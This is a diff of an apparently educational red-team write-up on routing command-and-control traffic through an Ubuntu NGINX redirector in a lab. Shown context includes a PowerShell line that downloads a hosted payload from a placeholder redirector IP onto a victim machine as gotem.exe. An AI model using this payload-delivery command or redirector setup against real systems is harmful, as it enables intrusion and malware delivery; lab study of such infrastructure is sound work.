@@ -8,6 +8,7 @@ What we will be doing with the Ubuntu server is routing our C2 traffic through i
 
 	Parrot <> Ubuntu <> Victim VM 
 
+<img src="/images/basic-redirector.png" alt="Markdown Monster icon" style="float: left; margin-right: 10px;" />
 
 Lets install any Ubuntu server ISO from the interwebs [here](https://ubuntu.com/download/server).
 
@@ -84,3 +85,8 @@ Lets install any Ubuntu server ISO from the interwebs [here](https://ubuntu.com/
 	```powershell 
 	iwr -uri http://<ubuntu-nginx-ip>/hosted-payload -outfile C:\windows\temp\gotem.exe
 	```
+
+# Resources
+- [How to setup NGINX server on ubuntu](https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-20-04)
+  - > This writeup was made following this if you need a better explination
+- [Something forwarding C2 coms](https://coffeegist.com/security/resilient-red-team-https-redirection-using-nginx/)
